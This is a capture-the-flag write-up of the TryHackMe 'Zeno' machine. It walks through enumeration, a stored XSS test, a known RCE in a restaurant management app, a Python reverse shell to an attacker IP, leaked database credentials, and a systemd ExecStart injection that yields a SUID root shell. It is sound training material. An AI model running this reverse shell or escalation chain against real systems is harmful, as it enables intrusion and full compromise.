# Zeno - Writeup

- **Machine Name:** Zeno  
- **Platform:** TryHackMe
- **Difficulty:** Medium

## Enumeration

### Nmap Scan
```bash
nmap 10.64.179.44 --top-ports=5000 -sC -sV -o nmap_scan

# Nmap 7.95 scan initiated Sat Jan 24 23:35:23 2026 as: /usr/lib/nmap/nmap --privileged -sV -sC -T4 -Pn --top-ports=5000 -o nmap_scan 10.64.179.44
Nmap scan report for 10.64.179.44
Host is up (0.13s latency).
Not shown: 4969 filtered tcp ports (no-response), 29 filtered tcp ports (host-prohibited)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:23:62:a2:18:62:83:69:04:40:62:32:97:ff:3c:cd (RSA)
|   256 33:66:35:36:b0:68:06:32:c1:8a:f6:01:bc:43:38:ce (ECDSA)
|_  256 14:98:e3:84:70:55:e6:60:0c:c2:09:77:f8:b7:a6:1c (ED25519)
12340/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
| http-methods: 
|_  Potentially risky methods: TRACE
```

After the scanning. I started a directory enumeration with gobuster:
```bash
gobuster dir -u http://10.64.179.44:12340 -w /usr/share/wordlists/dirb/big.txt --random-agent
```

Some minutes after, the command returned the ```/rms``` directory.
This directory hosted a Restaurant Management System web application.

## Vulnerability Analysis

### Stored Cross-Site Scripting

While testing the application, a stored Cross-Site Scripting (XSS) vulnerability was identified at the register functionality.
It was possible to set your first name as a XSS Payload, such as: ```<img src=x onerror="alert(1)">```. This would trigger an alert when accessing your profile information.
However, the XSS did not lead to session hijacking or further compromise and was not useful for exploitation.

### Remote Code Execution

Further research revealed that the application version was vulnerable to a known Remote Code Execution flaw:

```bash
searchsploit restaurant management system               
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Restaurant Management System 1.0  - SQL Injection                                 | php/webapps/51330.txt
Restaurant Management System 1.0 - Remote Code Execution                          | php/webapps/47520.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Exploitation

I set up a netcat listener:

```bash
nc -lnvp 443
listening on [any] 443 ...
```

I ran the exploit, which uploaded a malicious PHP file at: ```/images/reverse-shell.php```

Then, I received a connection after injecting the following Python reverse shell payload: 
```
export RHOST="192.168.136.51";export RPORT=555;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

## Post Exploitation

### Credential Discovery

While enumerating the web directory, the following file was identified:

```
/var/www/html/rms/connection/config.php
```

This file contained hardcoded database credentials:

```
root: veerUffIrangUfcubyig
```

### MySQL Access

The credentials were used to access the local MySQL service:

```
mysql -h 127.0.0.1 -u root -p
```

Although access was successful, no useful information was found in the databases. Further privilege escalation was required.

## Privilege Escalation

### Local Enumeration

After running linenum.sh, a sensitive file was found in:

```
/etc/fstab
```

This file contained a reusable password, which allowed escalation to the user edward.

The user flag was retrieved from:

```
/home/edward/user.txt
```

### Sudo Permissions

Checking sudo privileges with ```sudo -l```, I discovered that we can run ```/usr/sbin/reboot``` with root privileges.

While limited, this permission became useful in combination with another misconfiguration.

### systemd Service Abuse

Further enumeration with LinPEAS revealed thath we have write permissions on the following service file:

```/etc/systemd/system/zeno-monitoring.service```

I modified the original file by injecting a malicious payload into the ExecStart directive:

```ExecStart=/bin/bash -c 'cp /bin/bash /home/edward/bash; chmod +xs /home/edward/bash'```

## Root Access

After modifying the service, the system was rebooted:

```sudo /usr/sbin/reboot```

Once the system restarted, the reverse shell was re-established.

The SUID bash binary was then executed:

```/home/edward/bash -p```

This resulted in a root shell.

The root flag was obtained from:

```/root/root.txt```

## Conclusion

Even being a tough machine, it was a very fun to play with and I have leaned a lot from it. 

This machine demonstrated the importance of:

- Keeping web applications up to date
- Avoiding writable systemd service files
- Restricting sudo permissions

The exploitation chain combined a known RCE vulnerability with poor system configuration to achieve full system compromise.
